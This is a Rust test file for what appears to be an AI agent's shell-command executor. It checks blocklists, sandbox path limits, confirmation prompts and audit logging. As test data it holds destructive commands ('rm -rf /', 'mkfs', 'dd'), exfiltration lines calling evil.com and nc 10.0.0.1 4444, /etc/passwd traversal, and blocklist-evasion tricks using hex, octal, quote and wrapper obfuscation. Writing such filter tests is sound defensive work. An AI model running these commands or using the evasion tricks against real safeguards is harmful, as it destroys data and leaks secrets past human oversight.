// SPDX-FileCopyrightText: 2026 Andrei G <bug-ops>
// SPDX-License-Identifier: MIT OR Apache-2.0

use super::*;

fn default_config() -> ShellConfig {
    ShellConfig {
        timeout: 30,
        blocked_commands: Vec::new(),
        allowed_commands: Vec::new(),
        allowed_paths: Vec::new(),
        allow_network: true,
        confirm_patterns: Vec::new(),
    }
}

fn sandbox_config(allowed_paths: Vec<String>) -> ShellConfig {
    ShellConfig {
        allowed_paths,
        ..default_config()
    }
}

#[test]
fn extract_single_bash_block() {
    let text = "Here is code:\n```bash\necho hello\n```\nDone.";
    let blocks = extract_bash_blocks(text);
    assert_eq!(blocks, vec!["echo hello"]);
}

#[test]
fn extract_multiple_bash_blocks() {
    let text = "```bash\nls\n```\ntext\n```bash\npwd\n```";
    let blocks = extract_bash_blocks(text);
    assert_eq!(blocks, vec!["ls", "pwd"]);
}

#[test]
fn ignore_non_bash_blocks() {
    let text = "```python\nprint('hi')\n```\n```bash\necho hi\n```";
    let blocks = extract_bash_blocks(text);
    assert_eq!(blocks, vec!["echo hi"]);
}

#[test]
fn no_blocks_returns_none() {
    let text = "Just plain text, no code blocks.";
    let blocks = extract_bash_blocks(text);
    assert!(blocks.is_empty());
}

#[test]
fn unclosed_block_ignored() {
    let text = "```bash\necho hello";
    let blocks = extract_bash_blocks(text);
    assert!(blocks.is_empty());
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn execute_simple_command() {
    let (result, code) =
        execute_bash("echo hello", Duration::from_secs(30), None, None, None).await;
    assert!(result.contains("hello"));
    assert_eq!(code, 0);
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn execute_stderr_output() {
    let (result, _) = execute_bash("echo err >&2", Duration::from_secs(30), None, None, None).await;
    assert!(result.contains("[stderr]"));
    assert!(result.contains("err"));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn execute_stdout_and_stderr_combined() {
    let (result, _) = execute_bash(
        "echo out && echo err >&2",
        Duration::from_secs(30),
        None,
        None,
        None,
    )
    .await;
    assert!(result.contains("out"));
    assert!(result.contains("[stderr]"));
    assert!(result.contains("err"));
    assert!(result.contains('\n'));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn execute_empty_output() {
    let (result, code) = execute_bash("true", Duration::from_secs(30), None, None, None).await;
    assert_eq!(result, "(no output)");
    assert_eq!(code, 0);
}

#[tokio::test]
async fn blocked_command_rejected() {
    let config = ShellConfig {
        blocked_commands: vec!["rm -rf /".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    let response = "Run:\n```bash\nrm -rf /\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn timeout_enforced() {
    let config = ShellConfig {
        timeout: 1,
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    let response = "Run:\n```bash\nsleep 60\n```";
    let result = executor.execute(response).await;
    assert!(matches!(
        result,
        Err(ToolError::Timeout { timeout_secs: 1 })
    ));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn timeout_logged_as_audit_timeout_not_error() {
    use crate::audit::AuditLogger;
    use crate::config::AuditConfig;
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("audit.log");
    let audit_config = AuditConfig {
        enabled: true,
        destination: log_path.display().to_string(),
    };
    let logger = std::sync::Arc::new(AuditLogger::from_config(&audit_config).await.unwrap());
    let config = ShellConfig {
        timeout: 1,
        ..default_config()
    };
    let executor = ShellExecutor::new(&config).with_audit(logger);
    let _ = executor.execute("```bash\nsleep 60\n```").await;
    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    assert!(
        content.contains("\"type\":\"timeout\""),
        "expected AuditResult::Timeout, got: {content}"
    );
    assert!(
        !content.contains("\"type\":\"error\""),
        "timeout must not be logged as error: {content}"
    );
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn stderr_output_logged_as_audit_error() {
    use crate::audit::AuditLogger;
    use crate::config::AuditConfig;
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("audit.log");
    let audit_config = AuditConfig {
        enabled: true,
        destination: log_path.display().to_string(),
    };
    let logger = std::sync::Arc::new(AuditLogger::from_config(&audit_config).await.unwrap());
    let executor = ShellExecutor::new(&default_config()).with_audit(logger);
    let _ = executor.execute("```bash\necho err >&2\n```").await;
    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    assert!(
        content.contains("\"type\":\"error\""),
        "expected AuditResult::Error for [stderr] output, got: {content}"
    );
}

#[tokio::test]
async fn execute_no_blocks_returns_none() {
    let executor = ShellExecutor::new(&default_config());
    let result = executor.execute("plain text, no blocks").await;
    assert!(result.is_ok());
    assert!(result.unwrap().is_none());
}

#[tokio::test]
async fn execute_multiple_blocks_counted() {
    let executor = ShellExecutor::new(&default_config());
    let response = "```bash\necho one\n```\n```bash\necho two\n```";
    let result = executor.execute(response).await;
    let output = result.unwrap().unwrap();
    assert_eq!(output.blocks_executed, 2);
    assert!(output.summary.contains("one"));
    assert!(output.summary.contains("two"));
}

// --- command filtering tests ---

#[test]
fn default_blocked_always_active() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("rm -rf /").is_some());
    assert!(executor.find_blocked_command("sudo apt install").is_some());
    assert!(
        executor
            .find_blocked_command("mkfs.ext4 /dev/sda")
            .is_some()
    );
    assert!(
        executor
            .find_blocked_command("dd if=/dev/zero of=disk")
            .is_some()
    );
}

#[test]
fn user_blocked_additive() {
    let config = ShellConfig {
        blocked_commands: vec!["custom-danger".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(executor.find_blocked_command("sudo rm").is_some());
    assert!(
        executor
            .find_blocked_command("custom-danger script")
            .is_some()
    );
}

#[test]
fn blocked_prefix_match() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("rm -rf /home/user").is_some());
}

#[test]
fn blocked_infix_match() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("echo hello && sudo rm")
            .is_some()
    );
}

#[test]
fn blocked_case_insensitive() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("SUDO apt install").is_some());
    assert!(executor.find_blocked_command("Sudo apt install").is_some());
    assert!(executor.find_blocked_command("SuDo apt install").is_some());
    assert!(
        executor
            .find_blocked_command("MKFS.ext4 /dev/sda")
            .is_some()
    );
    assert!(executor.find_blocked_command("DD IF=/dev/zero").is_some());
    assert!(executor.find_blocked_command("RM -RF /").is_some());
}

#[test]
fn safe_command_passes() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("echo hello").is_none());
    assert!(executor.find_blocked_command("ls -la").is_none());
    assert!(executor.find_blocked_command("cat file.txt").is_none());
    assert!(executor.find_blocked_command("cargo build").is_none());
}

#[test]
fn partial_match_accepted_tradeoff() {
    let executor = ShellExecutor::new(&default_config());
    // "sudoku" is not the "sudo" command — word-boundary matching prevents false positive
    assert!(executor.find_blocked_command("sudoku").is_none());
}

#[test]
fn multiline_command_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("echo ok\nsudo rm").is_some());
}

#[test]
fn dd_pattern_blocks_dd_if() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("dd if=/dev/zero of=/dev/sda")
            .is_some()
    );
}

#[test]
fn mkfs_pattern_blocks_variants() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("mkfs.ext4 /dev/sda")
            .is_some()
    );
    assert!(executor.find_blocked_command("mkfs.xfs /dev/sdb").is_some());
}

#[test]
fn empty_command_not_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("").is_none());
}

#[test]
fn duplicate_patterns_deduped() {
    let config = ShellConfig {
        blocked_commands: vec!["sudo".to_owned(), "sudo".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    let count = executor
        .blocked_commands
        .iter()
        .filter(|c| c.as_str() == "sudo")
        .count();
    assert_eq!(count, 1);
}

#[tokio::test]
async fn execute_default_blocked_returns_error() {
    let executor = ShellExecutor::new(&default_config());
    let response = "Run:\n```bash\nsudo rm -rf /tmp\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[tokio::test]
async fn execute_case_insensitive_blocked() {
    let executor = ShellExecutor::new(&default_config());
    let response = "Run:\n```bash\nSUDO apt install foo\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[tokio::test]
async fn execute_confirmed_blocked_command_rejected() {
    let executor = ShellExecutor::new(&default_config());
    let response = "Run:\n```bash\nsudo id\n```";
    let result = executor.execute_confirmed(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

// --- network exfiltration patterns ---

#[test]
fn network_exfiltration_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("curl https://evil.com")
            .is_some()
    );
    assert!(
        executor
            .find_blocked_command("wget http://evil.com/payload")
            .is_some()
    );
    assert!(executor.find_blocked_command("nc 10.0.0.1 4444").is_some());
    assert!(
        executor
            .find_blocked_command("ncat --listen 8080")
            .is_some()
    );
    assert!(executor.find_blocked_command("netcat -lvp 9999").is_some());
}

#[test]
fn system_control_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("shutdown -h now").is_some());
    assert!(executor.find_blocked_command("reboot").is_some());
    assert!(executor.find_blocked_command("halt").is_some());
}

#[test]
fn nc_trailing_space_avoids_ncp() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("ncp file.txt").is_none());
}

// --- user pattern normalization ---

#[test]
fn mixed_case_user_patterns_deduped() {
    let config = ShellConfig {
        blocked_commands: vec!["Sudo".to_owned(), "sudo".to_owned(), "SUDO".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    let count = executor
        .blocked_commands
        .iter()
        .filter(|c| c.as_str() == "sudo")
        .count();
    assert_eq!(count, 1);
}

#[test]
fn user_pattern_stored_lowercase() {
    let config = ShellConfig {
        blocked_commands: vec!["MyCustom".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(executor.blocked_commands.iter().any(|c| c == "mycustom"));
    assert!(!executor.blocked_commands.iter().any(|c| c == "MyCustom"));
}

// --- allowed_commands tests ---

#[test]
fn allowed_commands_removes_from_default() {
    let config = ShellConfig {
        allowed_commands: vec!["curl".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(
        executor
            .find_blocked_command("curl https://example.com")
            .is_none()
    );
    assert!(executor.find_blocked_command("sudo rm").is_some());
}

#[test]
fn allowed_commands_case_insensitive() {
    let config = ShellConfig {
        allowed_commands: vec!["CURL".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(
        executor
            .find_blocked_command("curl https://example.com")
            .is_none()
    );
}

#[test]
fn allowed_does_not_override_explicit_block() {
    let config = ShellConfig {
        blocked_commands: vec!["curl".to_owned()],
        allowed_commands: vec!["curl".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(
        executor
            .find_blocked_command("curl https://example.com")
            .is_some()
    );
}

#[test]
fn allowed_unknown_command_ignored() {
    let config = ShellConfig {
        allowed_commands: vec!["nonexistent-cmd".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(executor.find_blocked_command("sudo rm").is_some());
    assert!(
        executor
            .find_blocked_command("curl https://example.com")
            .is_some()
    );
}

#[test]
fn empty_allowed_commands_changes_nothing() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("curl https://example.com")
            .is_some()
    );
    assert!(executor.find_blocked_command("sudo rm").is_some());
    assert!(
        executor
            .find_blocked_command("wget http://evil.com")
            .is_some()
    );
}

// --- Phase 1: sandbox tests ---

#[test]
fn extract_paths_from_code() {
    let paths = extract_paths("cat /etc/passwd && ls /var/log");
    assert_eq!(paths, vec!["/etc/passwd".to_owned(), "/var/log".to_owned()]);
}

#[test]
fn extract_paths_handles_trailing_chars() {
    let paths = extract_paths("cat /etc/passwd; echo /var/log|");
    assert_eq!(paths, vec!["/etc/passwd".to_owned(), "/var/log".to_owned()]);
}

#[test]
fn extract_paths_detects_relative() {
    let paths = extract_paths("cat ./file.txt ../other");
    assert_eq!(paths, vec!["./file.txt".to_owned(), "../other".to_owned()]);
}

#[test]
fn sandbox_allows_cwd_by_default() {
    let executor = ShellExecutor::new(&default_config());
    let cwd = std::env::current_dir().unwrap();
    let cwd_path = cwd.display().to_string();
    let code = format!("cat {cwd_path}/file.txt");
    assert!(executor.validate_sandbox(&code).is_ok());
}

#[test]
fn sandbox_rejects_path_outside_allowed() {
    let config = sandbox_config(vec!["/tmp/test-sandbox".into()]);
    let executor = ShellExecutor::new(&config);
    let result = executor.validate_sandbox("cat /etc/passwd");
    assert!(matches!(result, Err(ToolError::SandboxViolation { .. })));
}

#[test]
fn sandbox_no_absolute_paths_passes() {
    let config = sandbox_config(vec!["/tmp".into()]);
    let executor = ShellExecutor::new(&config);
    assert!(executor.validate_sandbox("echo hello").is_ok());
}

#[test]
fn sandbox_rejects_dotdot_traversal() {
    let config = sandbox_config(vec!["/tmp/sandbox".into()]);
    let executor = ShellExecutor::new(&config);
    let result = executor.validate_sandbox("cat ../../../etc/passwd");
    assert!(matches!(result, Err(ToolError::SandboxViolation { .. })));
}

#[test]
fn sandbox_rejects_bare_dotdot() {
    let config = sandbox_config(vec!["/tmp/sandbox".into()]);
    let executor = ShellExecutor::new(&config);
    let result = executor.validate_sandbox("cd ..");
    assert!(matches!(result, Err(ToolError::SandboxViolation { .. })));
}

#[test]
fn sandbox_rejects_relative_dotslash_outside() {
    let config = sandbox_config(vec!["/nonexistent/sandbox".into()]);
    let executor = ShellExecutor::new(&config);
    let result = executor.validate_sandbox("cat ./secret.txt");
    assert!(matches!(result, Err(ToolError::SandboxViolation { .. })));
}

#[test]
fn sandbox_rejects_absolute_with_embedded_dotdot() {
    let config = sandbox_config(vec!["/tmp/sandbox".into()]);
    let executor = ShellExecutor::new(&config);
    let result = executor.validate_sandbox("cat /tmp/sandbox/../../../etc/passwd");
    assert!(matches!(result, Err(ToolError::SandboxViolation { .. })));
}

#[test]
fn has_traversal_detects_dotdot() {
    assert!(has_traversal("../etc/passwd"));
    assert!(has_traversal("./foo/../bar"));
    assert!(has_traversal("/tmp/sandbox/../../etc"));
    assert!(has_traversal(".."));
    assert!(!has_traversal("./safe/path"));
    assert!(!has_traversal("/absolute/path"));
    assert!(!has_traversal("no-dots-here"));
}

#[test]
fn extract_paths_detects_dotdot_standalone() {
    let paths = extract_paths("cd ..");
    assert_eq!(paths, vec!["..".to_owned()]);
}

// --- Phase 1: allow_network tests ---

#[test]
fn allow_network_false_blocks_network_commands() {
    let config = ShellConfig {
        allow_network: false,
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(
        executor
            .find_blocked_command("curl https://example.com")
            .is_some()
    );
    assert!(
        executor
            .find_blocked_command("wget http://example.com")
            .is_some()
    );
    assert!(executor.find_blocked_command("nc 10.0.0.1 4444").is_some());
}

#[test]
fn allow_network_true_keeps_default_behavior() {
    let config = ShellConfig {
        allow_network: true,
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    // Network commands are still blocked by DEFAULT_BLOCKED
    assert!(
        executor
            .find_blocked_command("curl https://example.com")
            .is_some()
    );
}

// --- Phase 2a: confirmation tests ---

#[test]
fn find_confirm_command_matches_pattern() {
    let config = ShellConfig {
        confirm_patterns: vec!["rm ".into(), "git push -f".into()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert_eq!(
        executor.find_confirm_command("rm /tmp/file.txt"),
        Some("rm ")
    );
    assert_eq!(
        executor.find_confirm_command("git push -f origin main"),
        Some("git push -f")
    );
}

#[test]
fn find_confirm_command_case_insensitive() {
    let config = ShellConfig {
        confirm_patterns: vec!["drop table".into()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(executor.find_confirm_command("DROP TABLE users").is_some());
}

#[test]
fn find_confirm_command_no_match() {
    let config = ShellConfig {
        confirm_patterns: vec!["rm ".into()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(executor.find_confirm_command("echo hello").is_none());
}

#[tokio::test]
async fn confirmation_required_returned() {
    let config = ShellConfig {
        confirm_patterns: vec!["rm ".into()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    let response = "```bash\nrm file.txt\n```";
    let result = executor.execute(response).await;
    assert!(matches!(
        result,
        Err(ToolError::ConfirmationRequired { .. })
    ));
}

#[tokio::test]
async fn execute_confirmed_skips_confirmation() {
    let config = ShellConfig {
        confirm_patterns: vec!["echo".into()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    let response = "```bash\necho confirmed\n```";
    let result = executor.execute_confirmed(response).await;
    assert!(result.is_ok());
    let output = result.unwrap().unwrap();
    assert!(output.summary.contains("confirmed"));
}

// --- default confirm patterns test ---

#[test]
fn default_confirm_patterns_loaded() {
    let config = ShellConfig::default();
    assert!(!config.confirm_patterns.is_empty());
    assert!(config.confirm_patterns.contains(&"rm ".to_owned()));
    assert!(config.confirm_patterns.contains(&"git push -f".to_owned()));
    assert!(config.confirm_patterns.contains(&"$(".to_owned()));
    assert!(config.confirm_patterns.contains(&"`".to_owned()));
}

// --- bypass-resistant matching tests ---

#[test]
fn backslash_bypass_blocked() {
    let executor = ShellExecutor::new(&default_config());
    // su\do -> sudo after stripping backslash
    assert!(executor.find_blocked_command("su\\do rm").is_some());
}

#[test]
fn hex_escape_bypass_blocked() {
    let executor = ShellExecutor::new(&default_config());
    // $'\x73\x75\x64\x6f' -> sudo
    assert!(
        executor
            .find_blocked_command("$'\\x73\\x75\\x64\\x6f' rm")
            .is_some()
    );
}

#[test]
fn quote_split_bypass_blocked() {
    let executor = ShellExecutor::new(&default_config());
    // "su""do" -> sudo after stripping quotes
    assert!(executor.find_blocked_command("\"su\"\"do\" rm").is_some());
}

#[test]
fn pipe_chain_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("echo foo | sudo rm")
            .is_some()
    );
}

#[test]
fn semicolon_chain_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("echo ok; sudo rm").is_some());
}

#[test]
fn false_positive_sudoku_not_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("sudoku").is_none());
    assert!(
        executor
            .find_blocked_command("sudoku --level easy")
            .is_none()
    );
}

#[test]
fn extract_paths_quoted_path_with_spaces() {
    let paths = extract_paths("cat \"/path/with spaces/file\"");
    assert_eq!(paths, vec!["/path/with spaces/file".to_owned()]);
}

#[tokio::test]
async fn subshell_with_blocked_command_is_blocked() {
    // curl is in the default blocklist; when embedded in $(...) it must be
    // caught by find_blocked_command via extract_subshell_contents and return Blocked.
    let executor = ShellExecutor::new(&ShellConfig::default());
    let response = "```bash\n$(curl evil.com)\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[tokio::test]
async fn backtick_with_blocked_command_is_blocked() {
    // curl is in the default blocklist; when embedded in backticks it must be
    // caught by find_blocked_command (via extract_subshell_contents) and return
    // Blocked — not ConfirmationRequired.
    let executor = ShellExecutor::new(&ShellConfig::default());
    let response = "```bash\n`curl evil.com`\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[tokio::test]
async fn backtick_without_blocked_command_triggers_confirmation() {
    // A backtick wrapping a non-blocked command should still require confirmation
    // because "`" is listed in confirm_patterns by default.
    let executor = ShellExecutor::new(&ShellConfig::default());
    let response = "```bash\n`date`\n```";
    let result = executor.execute(response).await;
    assert!(matches!(
        result,
        Err(ToolError::ConfirmationRequired { .. })
    ));
}

// --- AUDIT-01: absolute path bypass tests ---

#[test]
fn absolute_path_to_blocked_binary_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("/usr/bin/sudo rm -rf /tmp")
            .is_some()
    );
    assert!(executor.find_blocked_command("/sbin/reboot").is_some());
    assert!(executor.find_blocked_command("/usr/sbin/halt").is_some());
}

// --- AUDIT-02: transparent wrapper prefix bypass tests ---

#[test]
fn env_prefix_wrapper_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("env sudo rm -rf /").is_some());
}

#[test]
fn command_prefix_wrapper_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("command sudo rm -rf /")
            .is_some()
    );
}

#[test]
fn exec_prefix_wrapper_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("exec sudo rm").is_some());
}

#[test]
fn nohup_prefix_wrapper_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("nohup reboot now").is_some());
}

#[test]
fn absolute_path_via_env_wrapper_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("env /usr/bin/sudo rm -rf /")
            .is_some()
    );
}

// --- AUDIT-03: octal escape bypass tests ---

#[test]
fn octal_escape_bypass_blocked() {
    let executor = ShellExecutor::new(&default_config());
    // $'\163\165\144\157' = sudo in octal
    assert!(
        executor
            .find_blocked_command("$'\\163\\165\\144\\157' rm")
            .is_some()
    );
}

#[tokio::test]
async fn with_audit_attaches_logger() {
    use crate::audit::AuditLogger;
    use crate::config::AuditConfig;
    let config = default_config();
    let executor = ShellExecutor::new(&config);
    let audit_config = AuditConfig {
        enabled: true,
        destination: "stdout".into(),
    };
    let logger = std::sync::Arc::new(AuditLogger::from_config(&audit_config).await.unwrap());
    let executor = executor.with_audit(logger);
    assert!(executor.audit_logger.is_some());
}

#[test]
fn chrono_now_returns_valid_timestamp() {
    let ts = chrono_now();
    assert!(!ts.is_empty());
    let parsed: u64 = ts.parse().unwrap();
    assert!(parsed > 0);
}

#[cfg(unix)]
#[tokio::test]
async fn execute_bash_injects_extra_env() {
    let mut env = std::collections::HashMap::new();
    env.insert(
        "ZEPH_TEST_INJECTED_VAR".to_owned(),
        "hello-from-env".to_owned(),
    );
    let (result, code) = execute_bash(
        "echo $ZEPH_TEST_INJECTED_VAR",
        Duration::from_secs(5),
        None,
        None,
        Some(&env),
    )
    .await;
    assert_eq!(code, 0);
    assert!(result.contains("hello-from-env"));
}

#[cfg(unix)]
#[tokio::test]
async fn shell_executor_set_skill_env_injects_vars() {
    use crate::executor::ToolExecutor;

    let config = ShellConfig {
        timeout: 5,
        allowed_commands: vec![],
        blocked_commands: vec![],
        allowed_paths: vec![],
        confirm_patterns: vec![],
        allow_network: false,
    };

    let executor = ShellExecutor::new(&config);
    let mut env = std::collections::HashMap::new();
    env.insert("MY_SKILL_SECRET".to_owned(), "injected-value".to_owned());
    executor.set_skill_env(Some(env));
    let result = executor
        .execute("```bash\necho $MY_SKILL_SECRET\n```")
        .await
        .unwrap()
        .unwrap();
    assert!(result.summary.contains("injected-value"));
    executor.set_skill_env(None);
}

#[cfg(unix)]
#[tokio::test]
async fn execute_bash_error_handling() {
    let (result, code) = execute_bash("false", Duration::from_secs(5), None, None, None).await;
    assert_eq!(result, "(no output)");
    assert_eq!(code, 1);
}

#[cfg(unix)]
#[tokio::test]
async fn execute_bash_command_not_found() {
    let (result, _) = execute_bash(
        "nonexistent-command-xyz",
        Duration::from_secs(5),
        None,
        None,
        None,
    )
    .await;
    assert!(result.contains("[stderr]") || result.contains("[error]"));
}

#[test]
fn extract_paths_empty() {
    assert!(extract_paths("").is_empty());
}

#[tokio::test]
async fn policy_deny_blocks_command() {
    let policy = PermissionPolicy::from_legacy(&["forbidden".to_owned()], &[]);
    let executor = ShellExecutor::new(&default_config()).with_permissions(policy);
    let response = "```bash\nforbidden command\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[tokio::test]
async fn policy_ask_requires_confirmation() {
    let policy = PermissionPolicy::from_legacy(&[], &["risky".to_owned()]);
    let executor = ShellExecutor::new(&default_config()).with_permissions(policy);
    let response = "```bash\nrisky operation\n```";
    let result = executor.execute(response).await;
    assert!(matches!(
        result,
        Err(ToolError::ConfirmationRequired { .. })
    ));
}

#[tokio::test]
async fn policy_allow_skips_checks() {
    use crate::permissions::PermissionRule;
    use std::collections::HashMap;
    let mut rules = HashMap::new();
    rules.insert(
        "bash".to_owned(),
        vec![PermissionRule {
            pattern: "*".to_owned(),
            action: PermissionAction::Allow,
        }],
    );
    let policy = PermissionPolicy::new(rules);
    let executor = ShellExecutor::new(&default_config()).with_permissions(policy);
    let response = "```bash\necho hello\n```";
    let result = executor.execute(response).await;
    assert!(result.is_ok());
}

#[tokio::test]
async fn blocked_command_logged_to_audit() {
    use crate::audit::AuditLogger;
    use crate::config::AuditConfig;
    let config = ShellConfig {
        blocked_commands: vec!["dangerous".to_owned()],
        ..default_config()
    };
    let audit_config = AuditConfig {
        enabled: true,
        destination: "stdout".into(),
    };
    let logger = std::sync::Arc::new(AuditLogger::from_config(&audit_config).await.unwrap());
    let executor = ShellExecutor::new(&config).with_audit(logger);
    let response = "```bash\ndangerous command\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[test]
fn tool_definitions_returns_bash() {
    let executor = ShellExecutor::new(&default_config());
    let defs = executor.tool_definitions();
    assert_eq!(defs.len(), 1);
    assert_eq!(defs[0].id, "bash");
    assert_eq!(
        defs[0].invocation,
        crate::registry::InvocationHint::FencedBlock("bash")
    );
}

#[test]
fn tool_definitions_schema_has_command_param() {
    let executor = ShellExecutor::new(&default_config());
    let defs = executor.tool_definitions();
    let obj = defs[0].schema.as_object().unwrap();
    let props = obj["properties"].as_object().unwrap();
    assert!(props.contains_key("command"));
    let req = obj["required"].as_array().unwrap();
    assert!(req.iter().any(|v| v.as_str() == Some("command")));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn cancel_token_kills_child_process() {
    let token = CancellationToken::new();
    let token_clone = token.clone();
    tokio::spawn(async move {
        tokio::time::sleep(Duration::from_millis(100)).await;
        token_clone.cancel();
    });
    let (result, code) = execute_bash(
        "sleep 60",
        Duration::from_secs(30),
        None,
        Some(&token),
        None,
    )
    .await;
    assert_eq!(code, 130);
    assert!(result.contains("[cancelled]"));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn cancel_token_none_does_not_cancel() {
    let (result, code) = execute_bash("echo ok", Duration::from_secs(5), None, None, None).await;
    assert_eq!(code, 0);
    assert!(result.contains("ok"));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn cancel_kills_child_process_group() {
    use std::path::Path;
    let marker = format!("/tmp/zeph-pgkill-test-{}", std::process::id());
    let script = format!("bash -c 'sleep 30 && touch {marker}' & sleep 60");
    let token = CancellationToken::new();
    let token_clone = token.clone();
    tokio::spawn(async move {
        tokio::time::sleep(Duration::from_millis(200)).await;
        token_clone.cancel();
    });
    let (result, code) =
        execute_bash(&script, Duration::from_secs(30), None, Some(&token), None).await;
    assert_eq!(code, 130);
    assert!(result.contains("[cancelled]"));
    // Wait briefly, then verify the subprocess did NOT create the marker file
    tokio::time::sleep(Duration::from_millis(500)).await;
    assert!(
        !Path::new(&marker).exists(),
        "subprocess should have been killed with process group"
    );
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn shell_executor_cancel_returns_cancelled_error() {
    let token = CancellationToken::new();
    let token_clone = token.clone();
    tokio::spawn(async move {
        tokio::time::sleep(Duration::from_millis(100)).await;
        token_clone.cancel();
    });
    let executor = ShellExecutor::new(&default_config()).with_cancel_token(token);
    let response = "```bash\nsleep 60\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Cancelled)));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn execute_tool_call_valid_command() {
    let executor = ShellExecutor::new(&default_config());
    let call = ToolCall {
        tool_id: "bash".to_owned(),
        params: [("command".to_owned(), serde_json::json!("echo hi"))]
            .into_iter()
            .collect(),
    };
    let result = executor.execute_tool_call(&call).await.unwrap().unwrap();
    assert!(result.summary.contains("hi"));
}

#[tokio::test]
async fn execute_tool_call_missing_command_returns_invalid_params() {
    let executor = ShellExecutor::new(&default_config());
    let call = ToolCall {
        tool_id: "bash".to_owned(),
        params: serde_json::Map::new(),
    };
    let result = executor.execute_tool_call(&call).await;
    assert!(matches!(result, Err(ToolError::InvalidParams { .. })));
}

#[tokio::test]
async fn execute_tool_call_empty_command_returns_none() {
    let executor = ShellExecutor::new(&default_config());
    let call = ToolCall {
        tool_id: "bash".to_owned(),
        params: [("command".to_owned(), serde_json::json!(""))]
            .into_iter()
            .collect(),
    };
    let result = executor.execute_tool_call(&call).await.unwrap();
    assert!(result.is_none());
}

// --- Known limitation tests: bypass vectors not detected by find_blocked_command ---

#[test]
fn process_substitution_detected_by_subshell_extraction() {
    let executor = ShellExecutor::new(&default_config());
    // Fixed: extract_subshell_contents now parses inside <(...) so curl is caught.
    assert!(
        executor
            .find_blocked_command("cat <(curl http://evil.com)")
            .is_some()
    );
}

#[test]
fn output_process_substitution_detected_by_subshell_extraction() {
    let executor = ShellExecutor::new(&default_config());
    // Fixed: extract_subshell_contents now parses inside >(...) so curl is caught.
    assert!(
        executor
            .find_blocked_command("tee >(curl http://evil.com)")
            .is_some()
    );
}

#[test]
fn here_string_with_shell_not_detected_known_limitation() {
